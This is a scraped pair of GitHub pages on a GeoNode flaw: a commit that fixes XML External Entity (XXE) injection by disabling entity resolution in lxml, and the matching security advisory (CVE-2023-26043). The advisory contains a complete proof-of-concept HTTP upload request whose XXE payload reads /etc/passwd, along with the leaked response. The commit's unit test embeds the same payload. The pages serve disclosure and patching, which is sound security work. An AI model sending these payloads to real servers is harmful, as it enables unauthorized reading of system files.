=== Content from github.com_81117937_20250115_093636.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGeoNode%2Fgeonode%2Fcommit%2F2fdfe919f299b21f1609bf898f9dcfde58770ac0)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGeoNode%2Fgeonode%2Fcommit%2F2fdfe919f299b21f1609bf898f9dcfde58770ac0)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=GeoNode%2Fgeonode)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GeoNode](/GeoNode)
/
**[geonode](/GeoNode/geonode)**
Public

* [Notifications](/login?return_to=%2FGeoNode%2Fgeonode) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2FGeoNode%2Fgeonode)
* [Star
   1.5k](/login?return_to=%2FGeoNode%2Fgeonode)

* [Code](/GeoNode/geonode)
* [Issues
  295](/GeoNode/geonode/issues)
* [Pull requests
  61](/GeoNode/geonode/pulls)
* [Discussions](/GeoNode/geonode/discussions)
* [Actions](/GeoNode/geonode/actions)
* [Projects
  0](/GeoNode/geonode/projects)
* [Wiki](/GeoNode/geonode/wiki)
* [Security](/GeoNode/geonode/security)
* [Insights](/GeoNode/geonode/pulse)

Additional navigation options

* [Code](/GeoNode/geonode)
* [Issues](/GeoNode/geonode/issues)
* [Pull requests](/GeoNode/geonode/pulls)
* [Discussions](/GeoNode/geonode/discussions)
* [Actions](/GeoNode/geonode/actions)
* [Projects](/GeoNode/geonode/projects)
* [Wiki](/GeoNode/geonode/wiki)
* [Security](/GeoNode/geonode/security)
* [Insights](/GeoNode/geonode/pulse)

## Commit

[Permalink](/GeoNode/geonode/commit/2fdfe919f299b21f1609bf898f9dcfde58770ac0)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[Fixes [#10462](https://github.com/GeoNode/geonode/issues/10462)] GeoNode is vulnerable to an XML External Entity (XXE) …

[Browse files](/GeoNode/geonode/tree/2fdfe919f299b21f1609bf898f9dcfde58770ac0)
Browse the repository at this point in the history

```
…injection ([#10463](https://github.com/GeoNode/geonode/pull/10463)) ([#10467](https://github.com/GeoNode/geonode/pull/10467))

Co-authored-by: Alessio Fabiani <alessio.fabiani@geosolutionsgroup.com>
```

* Loading branch information

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions) [![@afabiani](https://avatars.githubusercontent.com/u/1278021?s=40&v=4)](/afabiani)

[github-actions[bot]](/GeoNode/geonode/commits?author=github-actions%5Bbot%5D "View all commits by github-actions[bot]")
and
[afabiani](/GeoNode/geonode/commits?author=afabiani "View all commits by afabiani")
authored
Dec 22, 2022

1 parent
[bd61d70](/GeoNode/geonode/commit/bd61d70c0754483fdcd8133a38718d9b747bcecd)

commit 2fdfe91

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**21 additions**
and
**5 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* geonode/geoserver

  + geonode/geoserver/helpers.py
    [helpers.py](#diff-1dc4455429508f45caf47e59390677a22f8ab523d545937854bcea2eb90484f4)
  + tests

    - geonode/geoserver/tests/test\_helpers.py
      [test\_helpers.py](#diff-0ecd210524c83ba214978bfae1c08023a22885c8cf72660c3d6fbaf214437cd0)
  + geonode/geoserver/views.py
    [views.py](#diff-cdab31b4199054738b79c5d37e7b98ca430aa7841c38b6c572e52fe0d1c9feaf)

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[geonode/geoserver/helpers.py](#diff-1dc4455429508f45caf47e59390677a22f8ab523d545937854bcea2eb90484f4 "geonode/geoserver/helpers.py")

Show comments

[View file](/GeoNode/geonode/blob/2fdfe919f299b21f1609bf898f9dcfde58770ac0/geonode/geoserver/helpers.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -238,7 +238,7 @@ def extract\_name\_from\_sld(gs\_catalog, sld, sld\_file=None): |
|  |  | sld = sld\_file.read() |
|  |  | if isinstance(sld, str): |
|  |  | sld = sld.encode('utf-8') |
|  |  | dom = etree.XML(sld) |
|  |  | dom = etree.XML(sld, parser=etree.XMLParser(resolve\_entities=False)) |
|  |  | elif sld\_file and isfile(sld\_file): |
|  |  | with open(sld\_file, "rb") as sld\_file: |
|  |  | sld = sld\_file.read() |
| Expand Down  Expand Up | | @@ -378,7 +378,7 @@ def set\_dataset\_style(saved\_dataset, title, sld, base\_file=None): |
|  |  | elif isinstance(sld, str): |
|  |  | sld = sld.strip('b\'\n') |
|  |  | sld = re.sub(r'(\\r)|(\\n)', '', sld).encode("UTF-8") |
|  |  | etree.XML(sld) |
|  |  | etree.XML(sld, parser=etree.XMLParser(resolve\_entities=False)) |
|  |  | elif base\_file and isfile(base\_file): |
|  |  | with open(base\_file, "rb") as sld\_file: |
|  |  | sld = sld\_file.read() |
| Expand Down | |  |

18 changes: 17 additions & 1 deletion

18
[geonode/geoserver/tests/test\_helpers.py](#diff-0ecd210524c83ba214978bfae1c08023a22885c8cf72660c3d6fbaf214437cd0 "geonode/geoserver/tests/test_helpers.py")

Show comments

[View file](/GeoNode/geonode/blob/2fdfe919f299b21f1609bf898f9dcfde58770ac0/geonode/geoserver/tests/test_helpers.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -28,7 +28,10 @@ |
|  |  | from geonode.decorators import on\_ogc\_backend |
|  |  | from geonode.tests.base import GeoNodeBaseTestSupport |
|  |  | from geonode.geoserver.views import \_response\_callback |
|  |  | from geonode.geoserver.helpers import get\_dataset\_storetype |
|  |  | from geonode.geoserver.helpers import ( |
|  |  | gs\_catalog, |
|  |  | get\_dataset\_storetype, |
|  |  | extract\_name\_from\_sld) |
|  |  | from geonode.layers.populate\_datasets\_data import create\_dataset\_data |
|  |  |  |
|  |  | from geonode.geoserver.ows import ( |
| Expand Down  Expand Up | | @@ -71,6 +74,19 @@ def setUp(self): |
|  |  | self.passwd = 'admin' |
|  |  | create\_dataset\_data() |
|  |  |  |
|  |  | @on\_ogc\_backend(geoserver.BACKEND\_PACKAGE) |
|  |  | def test\_extract\_name\_from\_sld(self): |
|  |  | content = """<?xml version="1.0" standalone="yes"?> |
|  |  | <!DOCTYPE foo [ <!ENTITY ent SYSTEM "/etc/passwd" > ]> |
|  |  | <foo xmlns="http://www.opengis.net/sld"> |
|  |  | <NamedLayer> |
|  |  | <UserStyle> |
|  |  | <Name>&ent;</Name> |
|  |  | </UserStyle> |
|  |  | </NamedLayer> |
|  |  | </foo>""" |
|  |  | self.assertIsNone(extract\_name\_from\_sld(gs\_catalog, content)) |
|  |  |  |
|  |  | @on\_ogc\_backend(geoserver.BACKEND\_PACKAGE) |
|  |  | def test\_replace\_callback(self): |
|  |  | content = f"""<Layer> |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[geonode/geoserver/views.py](#diff-cdab31b4199054738b79c5d37e7b98ca430aa7841c38b6c572e52fe0d1c9feaf "geonode/geoserver/views.py")

Show comments

[View file](/GeoNode/geonode/blob/2fdfe919f299b21f1609bf898f9dcfde58770ac0/geonode/geoserver/views.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -179,7 +179,7 @@ def respond(\*args, \*\*kw): |
|  |  | if isfile(sld): |
|  |  | with open(sld) as sld\_file: |
|  |  | sld = sld\_file.read() |
|  |  | etree.XML(sld) |
|  |  | etree.XML(sld, parser=etree.XMLParser(resolve\_entities=False)) |
|  |  | except Exception: |
|  |  | logger.exception("The uploaded SLD file is not valid XML") |
|  |  | raise Exception( |
| Expand Down  Expand Up | | @@ -799,7 +799,7 @@ def get\_capabilities(request, layerid=None, user=None, |
|  |  | } |
|  |  | gc\_str = tpl.render(ctx) |
|  |  | gc\_str = gc\_str.encode("utf-8", "replace") |
|  |  | layerelem = etree.XML(gc\_str) |
|  |  | layerelem = etree.XML(gc\_str, parser=etree.XMLParser(resolve\_entities=False)) |
|  |  | rootdoc = etree.ElementTree(layerelem) |
|  |  | except Exception as e: |
|  |  | import traceback |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `2fdfe91`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGeoNode%2Fgeonode%2Fcommit%2F2fdfe919f299b21f1609bf898f9dcfde58770ac0) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_340d55e7_20250115_093637.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGeoNode%2Fgeonode%2Fsecurity%2Fadvisories%2FGHSA-mcmc-c59m-pqq8)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FGeoNode%2Fgeonode%2Fsecurity%2Fadvisories%2FGHSA-mcmc-c59m-pqq8)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=GeoNode%2Fgeonode)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[GeoNode](/GeoNode)
/
**[geonode](/GeoNode/geonode)**
Public

* [Notifications](/login?return_to=%2FGeoNode%2Fgeonode) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2FGeoNode%2Fgeonode)
* [Star
   1.5k](/login?return_to=%2FGeoNode%2Fgeonode)

* [Code](/GeoNode/geonode)
* [Issues
  295](/GeoNode/geonode/issues)
* [Pull requests
  61](/GeoNode/geonode/pulls)
* [Discussions](/GeoNode/geonode/discussions)
* [Actions](/GeoNode/geonode/actions)
* [Projects
  0](/GeoNode/geonode/projects)
* [Wiki](/GeoNode/geonode/wiki)
* [Security](/GeoNode/geonode/security)
* [Insights](/GeoNode/geonode/pulse)

Additional navigation options

* [Code](/GeoNode/geonode)
* [Issues](/GeoNode/geonode/issues)
* [Pull requests](/GeoNode/geonode/pulls)
* [Discussions](/GeoNode/geonode/discussions)
* [Actions](/GeoNode/geonode/actions)
* [Projects](/GeoNode/geonode/projects)
* [Wiki](/GeoNode/geonode/wiki)
* [Security](/GeoNode/geonode/security)
* [Insights](/GeoNode/geonode/pulse)

# XML External Entity (XXE) injection in GeoServer style upload functionality

Moderate

[giohappy](/giohappy)
published
GHSA-mcmc-c59m-pqq8
Feb 27, 2023

## Package

No package listed

## Affected versions

<4.0.3

## Patched versions

4.0.3

## Description

### Summary

GeoNode is vulnerable to an XML External Entity (XXE) injection in the style upload functionality of GeoServer leading to Arbitrary File Read.

### Details

GeoNode's GeoServer has the ability to upload new styles for datasets through the [`dataset_style_upload` view](https://github.com/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/urls.py#L70-L72).

```
# https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/views.py#L158-L159
@login_required
def dataset_style_upload(request, layername):
    def respond(*args, **kw):
        kw['content_type'] = 'text/html'
        return json_response(*args, **kw)
    ...
    sld = request.FILES['sld'].read() # 1
    sld_name = None
    try:
        # Check SLD is valid
        ...
        sld_name = extract_name_from_sld(gs_catalog, sld, sld_file=request.FILES['sld']) # 2
    except Exception as e:
        respond(errors=f"The uploaded SLD file is not valid XML: {e}")
    name = data.get('name') or sld_name
    set_dataset_style(layer, data.get('title') or name, sld)
    return respond(
        body={
            'success': True,
            'style': data.get('title') or name, # 3
            'updated': data['update']})
```

`dataset_style_upload` gets a user-provided file (`1`), pass it to `extract_name_from_sld` to extract an element from it (`2`) and return the former in the response (`3`).

```
# https://github.dev/GeoNode/geonode/blob/99b0557da5c7db23c72ad39e466b88fe43edf82d/geonode/geoserver/helpers.py#L233-L234
def extract_name_from_sld(gs_catalog, sld, sld_file=None):
    try:
        if sld:
            if isfile(sld):
                with open(sld, "rb") as sld_file:
                    sld = sld_file.read() # 1
            if isinstance(sld, str):
                sld = sld.encode('utf-8')
            dom = etree.XML(sld) # 2
        ...
    named_dataset = dom.findall(
        "{http://www.opengis.net/sld}NamedLayer")
    el = None
    if named_dataset and len(named_dataset) > 0:
        user_style = named_dataset[0].findall("{http://www.opengis.net/sld}UserStyle")
        if user_style and len(user_style) > 0:
            el = user_style[0].findall("{http://www.opengis.net/sld}Name") # 3
    ...
    return el[0].text # 4
```

`extract_name_from_sld` uses `sld` (which is a path to the provided file), reads it (`1`) and parses it with [`etree.XML`](https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1312) in `2`. Since the former uses a [default XMLParser](https://github.com/python/cpython/blob/22d91c16bb03c3d87f53b5fee10325b876262a78/Lib/xml/etree/ElementTree.py#L1323-L1324), the parsing gets done with the [`resolve_entities` flag set to `True`](https://lxml.de/api/lxml.etree.XMLParser-class.html#:~:text=resolve_entities%3DTrue). Therefore, `dom` handles the parsed XML containing the resolved entity (`2`), gets `NamedLayer.UserStyle.Name` in `3` and returns the resolved content in `4`.

### PoC

1. Create a guest/non-privileged account and log in.
2. Upload a dataset through `/catalogue/#/upload/dataset` whose name we will be referencing as `<DATASET_NAME>`.
3. Send the following request that will try to upload a new style for the dataset. The response will be returning the resolved entity with the contents of `/etc/passwd`:

```
POST /gs/geonode:<DATASET_NAME>/style/upload HTTP/1.1
Host: localhost
Cookie: django_language=en-us; csrftoken=<CSRF-TOKEN>; sessionid=<SESSION-COOKIE>
X-Csrftoken: <CSRF-TOKEN>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfoo
Content-Length: 485
------WebKitFormBoundaryfoo
Content-Disposition: form-data; name="layerid"
1
------WebKitFormBoundaryfoo
Content-Disposition: form-data; name="sld"; filename="foo.sld"
Content-Type: application/octet-stream
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY ent SYSTEM "/etc/passwd" > ]>
<foo xmlns="http://www.opengis.net/sld">
  <NamedLayer>
    <UserStyle>
    	<Name>&ent;</Name>
    </UserStyle>
  </NamedLayer>
</foo>
------WebKitFormBoundaryfoo--

```

Sample response:

```
HTTP/1.1 200 OK
Server: nginx/1.23.2
...
{"success": true, "style": "root:x:0:0:root:/root:/bin/bash...", "updated": false}

```
### Impact

This issue may lead to authenticated `Arbitrary File Read`.

### Severity

Moderate

6.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

### CVE ID

CVE-2023-26043

### Weaknesses

[CWE-611](/advisories?query=cwe%3A611)

### Credits

* [![@jorgectf](https://avatars.githubusercontent.com/u/46056498?s=40&v=4)](/jorgectf)
  [jorgectf](/jorgectf)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


